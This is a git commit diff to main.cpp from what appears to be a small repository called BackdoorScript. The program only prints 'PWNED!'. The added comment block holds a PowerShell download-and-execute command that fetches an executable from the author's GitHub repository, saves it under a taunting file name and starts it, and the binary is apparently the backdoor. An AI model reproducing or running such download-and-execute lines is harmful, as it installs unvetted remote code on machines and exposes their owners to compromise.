6f9fc33641f67bce0ba9b81bc4e1d75703ad3177
Max Hamme <81451434+Al9haPh0enix@users.noreply.github.com>
2022-12-03 04:35:33 -0800

    download and run comments

--- main.cpp
+++ main.cpp
@@ -1,5 +1,10 @@
 #include <iostream>
 
+/*
+powershell Invoke-WebRequest -OutFile hackPwnedLOLRektLoserHAHAHA.exe -Uri https://github.com/Al9haPh0enix/BackdoorScript/blob/main/main.exe?raw=true
+start ./hackPwnedLOLRektLoserHAHAHA.exe
+*/
+
 int main(int argc, char const *argv[])
 {
     std::cout<<"PWNED!\n-Big M" << std::endl;
